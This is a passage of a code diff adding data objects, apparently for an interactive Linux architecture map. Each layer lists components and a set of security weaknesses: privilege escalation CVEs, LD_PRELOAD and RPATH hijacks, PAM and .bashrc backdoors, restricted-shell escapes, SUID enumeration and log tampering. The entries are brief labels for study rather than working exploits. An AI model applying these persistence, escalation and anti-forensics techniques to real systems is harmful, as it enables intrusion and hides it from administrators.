+  {l:'Key Syscalls (security)',s:['execve / execveat (code execution)','mmap / mprotect (memory control)','ptrace (process introspection)','clone / unshare (namespace creation)'],lk:'process_node'},
+  {l:'seccomp Filters',s:['prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)','BPF program evaluates each syscall','SECCOMP_RET_KILL / TRAP / ERRNO','libseccomp helper library'],lk:'seccomp_node'},
+  {l:'vsyscall / vDSO',s:['vDSO: kernel-mapped page in user VA','Fast path syscalls (gettimeofday)','vsyscall legacy: fixed address → ASLR defeat','Retpoline in vDSO stub'],lk:'vm_subsys'},
+  {l:'Audit Subsystem',s:['audit_log_syscall() per call','auditd reads via netlink socket','Filters: uid, syscall number, path','Full syscall argument capture'],lk:'audit_node'},
+ ],
+ security:['sys_call_table hijack (rootkit technique)','Syscall TOCTOU race condition','Integer overflow in syscall arguments','seccomp bypass (missing or new syscall)','ptrace() → arbitrary process read/write','vsyscall fixed address defeats ASLR'],
+ related:['kernel_core','seccomp_node','libc_node','process_node'],
+ paths:{up:['kernel_core'],down:['libc_node','seccomp_node'],xref:['process_node','audit_node']}},
+
+{id:'irq_node',   layer:'driver', wx:1120, wy:790,  label:'Interrupts / IRQs',
+ desc:'Asynchronous signals from hardware. Hardirq handlers run with interrupts disabled. Deferred work via softirqs, tasklets, workqueues (can sleep).',
+ components:[
+  {l:'Hardware IRQs',s:['IRQ number → vector mapping','irq_desc struct per IRQ','/proc/interrupts live view','Interrupt affinity (/proc/irq/N/smp_affinity)'],lk:'cpu'},
+  {l:'Softirqs',s:['NET_TX/RX_SOFTIRQ','TIMER_SOFTIRQ, RCU_SOFTIRQ','Runs after hardirq (interrupts re-enabled)','ksoftirqd kernel thread per CPU'],lk:null},
+  {l:'Tasklets',s:['Scheduled from hardirq handler','Runs once per CPU (serialised)','Deprecated (use threaded IRQs now)','tasklet_struct'],lk:null},
+  {l:'Workqueues',s:['Kernel threads (kworker/N:M)','Can sleep (unlike softirqs)','alloc_workqueue() creation','system_wq default shared queue'],lk:null},
+ ],
+ security:['IRQ timing side-channel (covert channel)','Interrupt handler null-deref bug','Tasklet UAF race condition','Deferred work race conditions'],
+ related:['cpu','drivers','kernel_core'],
+ paths:{up:['cpu'],down:[],xref:['kernel_core','drivers']}},
+
+{id:'filesystem', layer:'driver', wx:1450, wy:790,  label:'VFS / Filesystems',
+ desc:'VFS provides uniform file API across all filesystem implementations. Permission enforcement (DAC + MAC) happens in VFS layer on every access.',
+ components:[
+  {l:'VFS Abstraction Layer',s:['inode (metadata + data pointers)','dentry (name → inode cache)','file struct (open fd context)','super_block (per-filesystem state)'],lk:null},
+  {l:'ext4 / XFS / Btrfs',s:['ext4: extent-based, journalled','XFS: high-performance 64-bit','Btrfs: CoW, snapshots, subvolumes','Resize/fsck tooling per-fs'],lk:null},
+  {l:'tmpfs / ramfs',s:['Lives entirely in RAM (page cache)','/tmp, /run, /dev/shm','Size limited by vm.dirty_ratio','Sensitive data never reaches disk'],lk:'memory'},
+  {l:'OverlayFS / UnionFS',s:['Layers: lower (RO) + upper (RW)','Used by Docker/containerd','Whiteout files represent deletions','Copy-on-write semantics'],lk:'cgroups_node'},
+  {l:'inotify / fanotify',s:['inotify_add_watch() file events','fanotify: permission events (blocking)','Used by AV / EDR agents','Evasion: atomic rename bypasses inotify'],lk:null},
+ ],
+ security:['Dirty Pipe (CVE-2022-0847): splice() pipe write to RO','TOCTOU race on file paths (symlink)','OverlayFS escape (CVE-2023-0386)','inotify evasion via atomic rename','/proc info leaks','Hardlink / symlink safety attacks'],
+ related:['kernel_core','dac_node','selinux_node','memory'],
+ paths:{up:['kernel_core'],down:['dac_node','selinux_node'],xref:['memory','proc_fs']}},
+
+// ─ LIBRARIES ─
+{id:'libc_node',  layer:'libs',   wx:130,  wy:610,  label:'glibc / libc',
+ desc:'C standard library. Wraps syscalls into portable functions. malloc/free implement userspace heap. Dynamic linker loads shared objects at runtime.',
+ components:[
+  {l:'malloc (ptmalloc2)',s:['main_arena + per-thread arenas','fastbins (< 80 bytes, no consolidation)','smallbins / largebins / unsortedbin','tcache: thread cache (glibc 2.26+)'],lk:null},
+  {l:'Dynamic Linker (ld.so)',s:['ld-linux-x86-64.so.2','Lazy binding (.plt stub → .got.plt)','LD_PRELOAD injection point','RPATH / RUNPATH search order'],lk:'glibc_load'},
+  {l:'stdio / POSIX API',s:['FILE* buffered I/O','Buffering modes: full / line / none','flockfile thread safety','fopen → open() syscall'],lk:null},
+  {l:'pthreads (NPTL)',s:['clone(CLONE_VM) under the hood','pthread_mutex / cond / rwlock','TLS (Thread Local Storage)','Per-thread stack via mmap'],lk:null},
+  {l:'NSS (Name Service Switch)',s:['/etc/nsswitch.conf routing','nss_dns, nss_files, nss_ldap','getaddrinfo() resolution chain','Poisoning via DNS / LDAP response'],lk:null},
+ ],
+ security:['Heap exploitation (tcache poisoning, fastbin dup, house of*)','Format string vuln (printf family)','Stack buffer overflow → ret addr control','GOT overwrite (write-what-where → shell)','LD_PRELOAD hooking (LPE in SUID context)','RELRO / PIE / canary mitigations'],
+ related:['vm_subsys','glibc_load','openssl_node','syscall_iface'],
+ paths:{up:['syscall_iface','vm_subsys'],down:['process_node','shell_node'],xref:['glibc_load','openssl_node']}},
+
+{id:'glibc_load', layer:'libs',   wx:420,  wy:610,  label:'Dynamic Linker',
+ desc:'ld-linux resolves symbols, loads shared objects, applies relocations. Controls what code runs at process start. Critical attack surface for privilege escalation.',
+ components:[
+  {l:'PLT / GOT Mechanism',s:['.plt: stub that calls GOT entry','.got.plt: resolved function addresses','Lazy vs eager binding (BIND_NOW)','FULL RELRO makes GOT read-only'],lk:null},
+  {l:'LD_PRELOAD',s:['Load before all others in search order','Hooks libc functions via symbol interposition','Legitimate: profiling, mocking in tests','Malicious: credential harvester, rootkit hook'],lk:null},
+  {l:'RPATH / RUNPATH',s:['DT_RPATH (obsolete) / DT_RUNPATH','$ORIGIN substitution (relative to binary)','Hijack: place evil .so in RPATH directory','Extra risk in SUID binaries'],lk:null},
+  {l:'Symbol Resolution',s:['Symbol versioning (GLIBC_2.xx@)','dlopen() / dlsym() at runtime','Weak vs strong symbol interposition','Full interposition via LD_PRELOAD'],lk:null},
+ ],
+ security:['GOT overwrite → code execution (partial RELRO)','LD_PRELOAD malicious SO in SUID context','RPATH hijack in SUID binary → LPE','ret2PLT technique (bypass NX)','Shared lib injection via /proc/pid/mem'],
+ related:['libc_node','vm_subsys','process_node'],
+ paths:{up:['vm_subsys'],down:['process_node'],xref:['libc_node']}},
+
+{id:'openssl_node',layer:'libs',  wx:710,  wy:610,  label:'OpenSSL / libcrypto',
+ desc:'TLS/crypto library used by almost every network application. Heartbleed proved a single library bug equals mass credential and key theft.',
+ components:[
+  {l:'TLS 1.3 / 1.2',s:['Handshake: ClientHello / ServerHello','Certificate validation chain','Session tickets / resumption','0-RTT early data (replay risk)'],lk:'socket_node'},
+  {l:'libcrypto Primitives',s:['AES-256-GCM, ChaCha20-Poly1305','RSA / ECDSA / Ed25519','SHA-2/SHA-3, BLAKE2','EVP high-level API'],lk:null},
+  {l:'X.509 Certificate Handling',s:['Subject / Issuer / SAN fields','Chain building (X509_STORE)','CRL / OCSP checking','CT (Certificate Transparency) SCT'],lk:null},
+  {l:'OpenSSL 3.x Provider Model',s:['Provider API replaces ENGINE','FIPS 140-2/3 validated builds','Legacy provider (old algorithms)','Default provider (modern algorithms)'],lk:null},
+ ],
+ security:['Heartbleed (CVE-2014-0160): OOB heap read → private key','POODLE (SSLv3 CBC padding oracle)','BEAST (CBC IV reuse in TLS 1.0)','Lucky13 / Bleichenbacher timing side-channel','Certificate validation bypass bugs'],
+ related:['libc_node','pam_node','ssh_node','socket_node'],
+ paths:{up:['syscall_iface'],down:['ssh_node','socket_node'],xref:['pam_node']}},
+
+{id:'dbus_node',  layer:'libs',   wx:1000, wy:610,  label:'D-Bus / IPC Libs',
+ desc:'Message bus for inter-process communication. systemd, desktop environments, and privileged daemons use it heavily. Policy files control who can call what.',
+ components:[
+  {l:'D-Bus Protocol',s:['Unix socket or TCP transport','Method call / signal / reply types','Unique names (:1.42) + well-known names','org.freedesktop.DBus bus daemon'],lk:null},
+  {l:'sd-bus (systemd)',s:['Efficient kernel AF_BUS transport','sd_bus_call_method() API','Variadic marshalling','vsock support for containers'],lk:'systemd_node'},
+  {l:'PolicyKit (polkit)',s:['org.freedesktop.PolicyKit1 interface','Action → implicit/explicit auth','pkexec runs commands as root','CVE-2021-3560: race → root (auth bypass)'],lk:'sudo_node'},
+  {l:'GDBus (GLib)',s:['GLib D-Bus wrapper','GDBusProxy for auto-generated stubs','Introspection XML spec','Used by all GNOME applications'],lk:'desktop_node'},
+ ],
+ security:['CVE-2021-3560 polkit TOCTOU → unauthenticated root','D-Bus policy misconfiguration → priv escalation','Signal injection to privileged daemon','Daemon name impersonation (first-registered wins)','D-Bus sniffing via dbus-monitor (local)'],
+ related:['systemd_node','sudo_node','desktop_node'],
+ paths:{up:['syscall_iface'],down:['systemd_node','desktop_node'],xref:['sudo_node']}},
+
+{id:'pam_node',   layer:'libs',   wx:1290, wy:610,  label:'PAM',
+ desc:'Pluggable Authentication Modules. Authentication pipeline stacks: auth → account → session → password. Every login goes through PAM.',
+ components:[
+  {l:'PAM Stack (/etc/pam.d/)',s:['required / requisite / sufficient / optional','common-auth included pattern','/etc/pam.d/sshd, sudo, login','Module order critically matters!'],lk:null},
+  {l:'pam_unix.so',s:['Reads /etc/shadow (SHA-512 hash)','unix_chkpwd SUID helper binary','NIS / yp lookup fallback','MD5 legacy hash detection'],lk:null},
+  {l:'pam_limits.so',s:['/etc/security/limits.conf rules','ulimit enforcement per login','nproc, nofile, memlock limits','Security: prevent fork bomb'],lk:null},
+  {l:'2FA / MFA Modules',s:['pam_google_authenticator.so (TOTP)','pam_duo.so','pam_yubico.so (YubiKey)','pam_radius.so (RADIUS)'],lk:null},
+  {l:'pam_faillock',s:['Failed login counter per user','Account lockout after N fails','/var/run/faillock/ state','Bypassed if pam_unix before faillock'],lk:null},
+ ],
+ security:['Malicious PAM module insertion (root persistence)','PAM bypass via misconfigured stack order','pam_rootok.so allows root to skip auth','Brute force if faillock not configured','Weak shadow hash (MD5 / SHA-1 legacy)'],
+ related:['openssl_node','ssh_node','sudo_node'],
+ paths:{up:[],down:['sudo_node','ssh_node'],xref:['openssl_node']}},
+
+{id:'ebpf_node',  layer:'libs',   wx:1580, wy:610,  label:'eBPF Runtime',
+ desc:'In-kernel bytecode VM. Hooks into kernel events with near-zero overhead. Used for tracing, networking, security (Falco, Cilium). Also a powerful offensive tool.',
+ components:[
+  {l:'eBPF Program Types',s:['kprobe/uprobe (function hooks)','tracepoint (static hooks)','XDP (network fast-path)','LSM BPF (security policy hooks)'],lk:'net_stack'},
+  {l:'Maps (Shared State)',s:['BPF_MAP_TYPE_HASH','BPF_MAP_TYPE_RINGBUF','BPF_MAP_TYPE_PERF_EVENT_ARRAY','Accessed from userspace via bpf() syscall'],lk:null},
+  {l:'Verifier',s:['Static analysis: bounded loop check','Pointer bounds and type checking','Speculative exec hardening','Type confusion bugs → LPE via verifier bypass'],lk:null},
+  {l:'JIT Compiler',s:['Translates eBPF bytecode → native code','BPF JIT hardening (jit_harden=2)','Unprivileged BPF disabled by default','JIT spray primitive (historical)'],lk:null},
+  {l:'bpftool / bpftrace',s:['bpftool prog list / map dump','bpftrace one-liner tracing','Syscall tracing, latency analysis','Falco: runtime threat detection via BPF'],lk:null},
+ ],
+ security:['CVE-2021-3490: OOB write via ALU32 → LPE','CVE-2022-23222: verifier type confusion','JIT spray attack (historical)','eBPF-based rootkit (hide processes, keylog)','Disable: sysctl kernel.unprivileged_bpf_disabled=1'],
+ related:['kernel_core','net_stack','sec_mech','seccomp_node'],
+ paths:{up:['kernel_core','net_stack'],down:[],xref:['sec_mech','seccomp_node']}},
+
+// ─ USERLAND ─
+{id:'systemd_node',layer:'user',  wx:130,  wy:440,  label:'systemd (PID 1)',
+ desc:'Init system and service manager. First userspace process. Manages units: services, sockets, timers, mounts. PID 1 crash = kernel panic.',
+ components:[
+  {l:'Unit Files (.service)',s:['/lib/systemd/system/ (vendor)','/etc/systemd/system/ (admin override)','/run/systemd/system/ (runtime)','ExecStart, ExecStartPre, ExecStop'],lk:null},
+  {l:'journald',s:['Binary log format (/run/log/journal)','Rate limiting (RateLimitBurst)','Forward to syslog socket','journalctl -f / --since / --until'],lk:'audit_node'},
+  {l:'logind',s:['Session lifecycle (pam_systemd)','Seat management','Inhibitor locks (prevent suspend)','Session files in /run/user/$UID'],lk:'pam_node'},
+  {l:'networkd / resolved',s:['systemd-networkd: link management','systemd-resolved: DNS STUB resolver','/etc/systemd/network/*.network','DNSSEC validation option'],lk:'socket_node'},
+  {l:'systemd-coredump',s:['Coredump capture to /var/lib/systemd/coredump','systemd-analyze security (unit score)','systemd-analyze blame (boot time)','Coredumps expose secrets: env vars, heap!'],lk:null},
+ ],
+ security:['Malicious .service file persistence (ExecStart backdoor)','journald CVE-2022-2526 (UAF)','Privilege escalation via unit ExecStart','Socket activation abuse','Coredumps leak secrets (env vars, heap data)'],
+ related:['dbus_node','cgroups_node','audit_node','process_node'],
+ paths:{up:['firmware','bootloader_node'],down:['process_node','cgroups_node'],xref:['dbus_node','audit_node']}},
+
+{id:'shell_node',  layer:'user',  wx:450,  wy:440,  label:'Shell (bash/zsh)',
+ desc:'Command interpreter. Reads rc files on startup. Parent of most user processes. Scripting language, process spawner, and common persistence vector.',
+ components:[
+  {l:'Startup File Order',s:['Login shell: /etc/profile → ~/.bash_profile','Interactive: ~/.bashrc','Non-interactive: $BASH_ENV variable','zsh: /etc/zshenv → ~/.zshrc'],lk:null},
+  {l:'Shell Builtins vs External',s:['Builtins: cd, export, alias, source','External: /bin/ls, /usr/bin/grep','which vs type disambiguation','Alias hijack via PATH manipulation'],lk:null},
+  {l:'Job Control',s:['fg / bg / jobs commands','SIGCONT / SIGSTOP signals','Process groups (PGID)','Controlling terminal (SIGHUP on close)'],lk:'process_node'},
+  {l:'Shell Scripting Security',s:['IFS manipulation attack','Unquoted variables → word splitting','eval injection (never use eval on input)','Glob expansion attacks (* in filenames)'],lk:null},
+  {l:'Restricted Shell (rbash)',s:['Disable cd, PATH change, redirects','Escape: editor trick (vi :!cmd)','Escape: python -c import os; os.system()','Escape: env var in command substitution'],lk:null},
+ ],
+ security:['.bashrc / .profile backdoor (persistent user access)','Command injection via unquoted variables','PS1 prompt injection (fake sudo prompt)','Shell escape from restricted shell (rbash)','History analysis: ~/.bash_history forensics','PATH hijack (relative command before absolute)'],
+ related:['process_node','filesystem','sudo_node'],
+ paths:{up:['libc_node'],down:['process_node'],xref:['filesystem','sudo_node']}},
+
+{id:'process_node',layer:'user',  wx:770,  wy:440,  label:'Processes & Threads',
+ desc:'Every running program is a process. fork/exec create children. /proc/<pid>/ exposes complete process state. Namespaces isolate. Capabilities grant fine-grained privileges.',
+ components:[
+  {l:'Process Lifecycle',s:['fork() → copy-on-write clone','exec() → replace process image','wait() → reap zombie child','PID / PPID / PGID / SID hierarchy'],lk:null},
+  {l:'/proc/<pid>/ Virtual Files',s:['/proc/pid/maps (VA layout → ASLR)','/proc/pid/mem (R/W process memory)','/proc/pid/fd/ (open file descriptors)','/proc/pid/environ (env vars at exec time)'],lk:'proc_fs'},
+  {l:'Linux Capabilities',s:['38 capabilities (CAP_NET_RAW, CAP_SYS_PTRACE)','Permitted / Effective / Inheritable sets','Ambient capabilities (across exec)','capsh / getpcaps / setcap tooling'],lk:'dac_node'},
+  {l:'Namespaces',s:['pid: isolated PID tree','net: private network stack','mnt: private mount namespace','user: map UIDs (unprivileged → root inside)'],lk:'cgroups_node'},
+  {l:'Signals',s:['SIGKILL (unblockable)','SIGTERM / SIGINT (catchable)','SIGSEGV / SIGBUS (fault signal)','kill() / tkill() / tgkill() syscalls'],lk:null},
+ ],
+ security:['/proc/<pid>/mem write → inject code into running process','Capability abuse (CAP_SYS_PTRACE = full inspect)','User namespace LPE (map uid=0, use nested ns)','PTRACE_POKETEXT: code injection technique','Namespace escape (container breakout)','Zombie analysis for forensics'],
+ related:['scheduler','cgroups_node','sec_mech','dac_node'],
+ paths:{up:['libc_node','glibc_load'],down:['cgroups_node','dac_node'],xref:['sec_mech','proc_fs']}},
+
+{id:'cgroups_node',layer:'user',  wx:1090, wy:440,  label:'cgroups / namespaces',
+ desc:'Control groups limit and account resource usage. Namespaces isolate system visibility. Together they form the kernel primitives that underpin all containers.',
+ components:[
+  {l:'cgroup v2 Hierarchy',s:['/sys/fs/cgroup/ unified tree','cgroup.procs (member PIDs)','memory.max / cpu.max hard limits','io.max (BPS / IOPS limits)'],lk:'filesystem'},
+  {l:'CPU / Memory Controllers',s:['cpu.weight (CFS relative weight)','memory.high (throttle) / memory.max (OOM)','memory.swap.max','cpuset.cpus.effective'],lk:'scheduler'},
+  {l:'Network Namespaces',s:['veth pairs (virtual Ethernet link)','ip netns CLI management','/proc/net/* inside namespace','nftables rules per-namespace'],lk:'net_stack'},
+  {l:'User Namespaces',s:['Map uid/gid ranges (newuidmap)','Unprivileged container root','uid_map / gid_map files','Security: restrict with sysctl'],lk:'process_node'},
+  {l:'Container Runtimes',s:['runc (OCI runtime spec)','containerd → runc chain','Podman (rootless containers)','seccomp + AppArmor + caps defense-in-depth'],lk:'seccomp_node'},
+ ],
+ security:['Container escape: CVE-2019-5736 (runc /proc/self/exe overwrite)','User namespace LPE (map root, nested namespaces)','Cgroup resource exhaustion (container DoS)','Namespace confusion (PID reuse between ns)','OverlayFS escape (CVE-2023-0386)'],
+ related:['scheduler','process_node','seccomp_node','filesystem'],
+ paths:{up:['scheduler','process_node'],down:['seccomp_node'],xref:['filesystem','net_stack']}},
+
+{id:'ssh_node',   layer:'user',   wx:1400, wy:440,  label:'SSH / sshd',
+ desc:'sshd runs as root and drops privileges post-authentication. Key exchange, authentication, channel multiplexing. Common remote entry point for attackers.',
+ components:[
+  {l:'SSH Protocol Flow',s:['TCP 22 → version string exchange','Key exchange (ECDH-SHA2-nistp256)','Host key verification (TOFU model)','Channel multiplexing (RFC 4254)'],lk:'socket_node'},
+  {l:'Authentication Methods',s:['publickey (authorized_keys file)','password (PAM backend)','keyboard-interactive','GSSAPI (Kerberos integration)'],lk:'pam_node'},
+  {l:'~/.ssh/ Structure',s:['authorized_keys (permitted public keys)','known_hosts (host fingerprints)','id_rsa / id_ed25519 (private keys)','config (client-side config)'],lk:'filesystem'},
+  {l:'Port Forwarding',s:['Local: -L 8080:internal:80','Remote: -R 9090:localhost:22','Dynamic: -D 1080 (SOCKS proxy)','PermitTunnel for full VPN'],lk:null},
+  {l:'sshd_config Hardening',s:['PermitRootLogin no','PasswordAuthentication no','AllowUsers / AllowGroups','MaxAuthTries 3'],lk:null},
+ ],
+ security:['authorized_keys backdoor persistence','CVE-2023-38408: ssh-agent RCE via PKCS#11','Port forwarding for lateral movement','Weak HostKeyAlgorithms / Ciphers','Log tampering (auth.log deletion)','ssh-agent socket hijack (SSH_AUTH_SOCK)'],
+ related:['openssl_node','pam_node','filesystem','socket_node'],
+ paths:{up:['openssl_node','pam_node'],down:[],xref:['socket_node','filesystem']}},
+
+{id:'sudo_node',  layer:'user',   wx:1720, wy:440,  label:'sudo / su / pkexec',
+ desc:'Privilege escalation mechanisms. sudo checks /etc/sudoers + PAM. pkexec uses polkit D-Bus. All are frequent LPE targets.',
+ components:[
+  {l:'/etc/sudoers',s:['user/group ALL=(ALL:ALL) ALL','NOPASSWD: (dangerous misconfiguration)','Cmnd_Alias for grouping commands','visudo for syntax-checked editing'],lk:null},
+  {l:'sudo Execution Flow',s:['Check sudoers for match','PAM auth (pam_sudo module)','setuid(0) if authorised','Audit log to /var/log/auth.log'],lk:'pam_node'},
+  {l:'SUID Binaries',s:['chmod u+s + root-owned → runs as root','find / -perm -4000 (enumeration)','GTFOBins: vim, python, find, awk…','Writable path + SUID → trivial LPE'],lk:'dac_node'},
+  {l:'pkexec / polkit',s:['org.freedesktop.policykit1','Action/subject authorization','CVE-2021-3560: race to root','PwnKit (CVE-2021-4034): OOB write'],lk:'dbus_node'},
+  {l:'su (set-user-id)',s:['Reads /etc/pam.d/su stack','PAM auth required','su -l (full login shell)','su - vs su (env clear difference)'],lk:'pam_node'},
+ ],
+ security:['CVE-2021-3156 Baron Samedit (heap OOB in sudoedit → root)','CVE-2021-4034 PwnKit (pkexec env[] OOB → root)','SUID binary exploitation (GTFOBins)','Sudo wildcard / NOPASSWD misconfiguration','sudoedit symlink attack','sudo token hijack via /proc/pid/mem'],
+ related:['pam_node','dbus_node','dac_node','shell_node'],
+ paths:{up:['pam_node','dbus_node'],down:[],xref:['dac_node','shell_node']}},
+
+// ─ SECURITY ─
+{id:'selinux_node',layer:'sec',   wx:100,  wy:275,  label:'SELinux / AppArmor',
+ desc:'Mandatory Access Control. Enforces labelled policy regardless of DAC. Prevents post-exploit lateral movement. Default deny with explicit allow rules.',
+ components:[
+  {l:'Type Enforcement (TE)',s:['Subject (process) type label','Object (file/socket) type label','Allow rules: allow httpd_t httpd_var_t:file { rw }','Default deny (closed-world assumption)'],lk:null},
+  {l:'Security Labels',s:['ls -Z (file security contexts)','/proc/self/attr/current (process context)','chcon / restorecon','semanage fcontext -a'],lk:'filesystem'},
+  {l:'SELinux Booleans',s:['getsebool -a (list all)','setsebool httpd_can_network_connect on','Runtime policy toggle (no recompile)','Permanent: -P flag'],lk:null},
+  {l:'AppArmor Profiles',s:['/etc/apparmor.d/ profile directory','Enforce vs Complain mode','aa-genprof profile generator','Network, file, capability rules'],lk:null},
+  {l:'audit2allow',s:['Parse AVC denial messages','Generate allow rules (review carefully!)','Permissive domain (targeted relaxation)','aa-logprof for AppArmor equivalent'],lk:'audit_node'},
+ ],
+ security:['Policy bypass via novel syscall code path','Permissive mode left enabled (distro default risk)','Label attack (exploit then restore labels)','Context transition abuse','Transient audit2allow rule over-permission'],
+ related:['kernel_core','filesystem','audit_node','syscall_iface'],
+ paths:{up:['filesystem','syscall_iface'],down:[],xref:['audit_node','dac_node']}},
+
+{id:'seccomp_node',layer:'sec',   wx:390,  wy:275,  label:'Seccomp / BPF',
+ desc:'Restricts which syscalls a process can make using BPF programs as filters. Docker uses a default seccomp profile. Dramatically reduces kernel attack surface.',
+ components:[
+  {l:'SECCOMP_MODE_STRICT',s:['Only: read, write, exit, sigreturn','Enabled via prctl(PR_SET_SECCOMP)','Very restrictive (rare in practice)','Not the same as filter mode'],lk:null},
+  {l:'SECCOMP_MODE_FILTER',s:['BPF program evaluates seccomp_data struct','Returns: ALLOW/KILL/TRAP/ERRNO/TRACE','Inheritable across exec() calls','libseccomp builds BPF programs'],lk:'ebpf_node'},
+  {l:'Docker Default Seccomp',s:['~44 syscalls blocked by default','Blocks: keyctl, ptrace, mount, kexec','/etc/docker/daemon.json profile path','Custom profiles via --security-opt'],lk:'cgroups_node'},
+  {l:'Seccomp Notifications',s:['SECCOMP_RET_USER_NOTIF','Supervisor process handles syscall','User-space seccomp supervisor pattern','Used in container runtimes'],lk:null},
+ ],
+ security:['Missing syscall in filter → new attack surface','eBPF verifier bug → seccomp bypass','SECCOMP_RET_TRACE information leak','ptrace: attach first, then bypass seccomp','New kernel syscalls not blocked by old profiles'],
+ related:['cgroups_node','ebpf_node','kernel_core','process_node'],
+ paths:{up:['kernel_core','syscall_iface'],down:[],xref:['ebpf_node','cgroups_node']}},
+
+{id:'dac_node',   layer:'sec',    wx:680,  wy:275,  label:'DAC / Permissions',
+ desc:'Discretionary Access Control. Unix rwx permission model. Extended by POSIX ACLs. SUID/SGID elevate privilege. Foundation of Unix security — and most misconfigurations.',
+ components:[
+  {l:'Unix Permission Bits',s:['rwxrwxrwx + special bits','Owner / Group / Other triple','chmod octal notation (644, 755, 4755)','umask default mask'],lk:null},
+  {l:'POSIX ACLs',s:['getfacl / setfacl CLI','Additional user:group entries','Mask entry (effective permission cap)','Default ACL inheritance on directories'],lk:null},
+  {l:'SUID / SGID / Sticky',s:['SUID (4xxx): execute as file owner','SGID (2xxx): execute as file group','Sticky (1xxx): only owner deletes (/tmp)','find / -perm -4000 for SUID enum'],lk:'sudo_node'},
+  {l:'Extended Attributes (xattr)',s:['security.* namespace (SELinux labels)','user.* namespace (arbitrary data)','trusted.* (root only)','capability.* (file capabilities)'],lk:'selinux_node'},
+  {l:'File Capabilities',s:['cap_net_bind_service on nginx binary','getcap / setcap CLI','Inheritable set: dangerous','Ambient capabilities on exec'],lk:'process_node'},
+ ],
+ security:['SUID binary exploitation (GTFOBins list)','World-writable sensitive files or directories','/tmp sticky bit bypass (hardlink race)','ACL bypass via unexpected group membership','File capability abuse (cap_dac_override)'],
+ related:['filesystem','sudo_node','selinux_node','process_node'],
+ paths:{up:['filesystem'],down:[],xref:['selinux_node','sudo_node','process_node']}},
+
+{id:'tpm_node',   layer:'sec',    wx:970,  wy:275,  label:'TPM / Secure Boot',
+ desc:'Hardware root of trust. TPM extends PCRs on each boot measurement. Secure Boot validates signatures at each stage. IMA measures files at runtime.',
+ components:[
+  {l:'TPM 2.0 PCR Registers',s:['PCR 0–7: firmware / UEFI measurements','PCR 8–9: bootloader / GRUB stage','PCR10+: OS kernel / IMA','SHA-256 bank preferred over SHA-1'],lk:'firmware'},
+  {l:'Sealed Keys',s:['Key bound to specific PCR state','Unseals only if boot unchanged','Used by LUKS (clevis/tang)','Linux equivalent of BitLocker'],lk:null},
+  {l:'Attestation',s:['Quote: signed PCR values + nonce','Verifier checks quote signature','Remote attestation (TPM 2.0 spec)','tpm2-tools: tpm2_quote'],lk:null},
+  {l:'IMA / EVM',s:['IMA: measures files before exec/mmap','Policy: measure all executables','IMA log: /sys/kernel/security/ima/ascii_runtime_measurements','EVM: HMAC over xattrs'],lk:'filesystem'},
+  {l:'dm-verity',s:['Block device Merkle hash tree','Root hash signed and TPM-sealed','Android / ChromeOS use this','systemd-veritysetup integration'],lk:null},
+ ],
+ security:['Secure Boot bypass: CVE-2020-10713 (BootHole), CVE-2022-21894','PCR value prediction (deterministic boot chain)','TPM bus sniffing (I2C/LPC/SPI sniff)','IMA policy bypass (new unlisted extension)','Cold boot: unseal without measured boot'],
+ related:['firmware','bootloader_node','kernel_core','filesystem'],
+ paths:{up:['firmware'],down:['bootloader_node'],xref:['kernel_core','filesystem']}},
+
+{id:'audit_node', layer:'sec',    wx:1260, wy:275,  label:'Audit / Logging',
+ desc:'auditd records syscall events. rsyslog/journald collect system logs. Logs feed SIEM. Attackers target log deletion/tampering. Forensic foundation.',
+ components:[
+  {l:'auditd / audit rules',s:['auditctl -a / -d rules','-w /etc/passwd -p wa -k passwd_write','-a always,exit -F arch=b64 -S execve','auditd.conf: space_left, max_log_file'],lk:'syscall_iface'},
+  {l:'/var/log Structure',s:['/var/log/auth.log (sudo, ssh, pam)','/var/log/syslog (general messages)','/var/log/kern.log (kernel messages)','/var/log/audit/audit.log (auditd)'],lk:'filesystem'},
+  {l:'rsyslog / syslog-ng',s:['Facility.Severity routing','Remote syslog (RFC 3164 / 5424)','TLS transport (syslog over TLS)','Log rotation (logrotate)'],lk:null},
+  {l:'Log Analysis Tools',s:['last / lastlog / lastb','journalctl --since --until','ausearch -k keyname','aureport --summary statistics'],lk:null},
+  {l:'SIEM Integration',s:['Filebeat → Elasticsearch','Splunk Universal Forwarder','Graylog GELF input','Sigma rules for detection'],lk:null},
+ ],
+ security:['Log tampering (truncate /var/log/auth.log)','Timestomping (touch -t on log files)','Audit evasion (edge case gaps)','Log injection via newlines in filenames','/var/log/lastlog manipulation','dmesg_restrict=0 leaks kernel addresses'],
+ related:['selinux_node','systemd_node','kernel_core'],
+ paths:{up:['kernel_core','syscall_iface'],down:[],xref:['selinux_node','systemd_node']}},
+
+{id:'netfilter_node',layer:'sec', wx:1550, wy:275,  label:'Netfilter / nftables',
+ desc:'In-kernel packet filtering framework. nftables (modern) / iptables (legacy) configure rules. Stateful conntrack tracks connections. Five hook points.',
+ components:[
+  {l:'Netfilter Hooks',s:['NF_INET_PRE_ROUTING (DNAT)','NF_INET_LOCAL_IN (incoming)','NF_INET_FORWARD (routing)','NF_INET_LOCAL_OUT / POST_ROUTING (SNAT)'],lk:'net_stack'},
+  {l:'nftables (modern)',s:['Tables → chains → rules structure','nft add rule inet filter input ...','Sets and maps (efficient bulk matching)','Flowtable (connection offload to HW)'],lk:null},
+  {l:'iptables (legacy)',s:['Tables: filter, nat, mangle, raw','Chains: INPUT, OUTPUT, FORWARD','-j ACCEPT/DROP/REJECT/LOG','ip6tables for IPv6'],lk:null},
+  {l:'conntrack (state table)',s:['Connection state: NEW/ESTABLISHED/RELATED','nf_conntrack_max tuning','/proc/net/nf_conntrack view','NAT binding via conntrack entry'],lk:null},
+  {l:'ipset',s:['Efficient bulk IP/subnet matching','ipset create myset hash:net','iptables -m set --match-set','Blocklists (Fail2ban uses ipset)'],lk:null},
+ ],
+ security:['Firewall rule bypass via fragmentation','Covert channel via ICMP/DNS tunnelling','SSRF via local routing rules','nftables rule injection (if writable)','conntrack exhaustion (DoS)','iptables log as forensic evidence'],
+ related:['net_stack','kernel_core','socket_node'],
+ paths:{up:['net_stack'],down:[],xref:['kernel_core','socket_node']}},
+
+{id:'sec_mech',   layer:'sec',    wx:1840, wy:275,  label:'Kernel Mitigations',
+ desc:'Collection of exploit mitigations. ASLR, KASLR, SMEP, SMAP, KPTI, CFI, stack canaries, RELRO, PIE. Each layer requires its own bypass — chaining is modern exploit dev.',
+ components:[
+  {l:'KASLR / ASLR',s:['KASLR: kernel load base randomised at boot','mmap_rnd_bits=32 (user ASLR entropy)','kptr_restrict=2 (hide all symbols)','Defeat: info leak + fixed offset'],lk:'vm_subsys'},
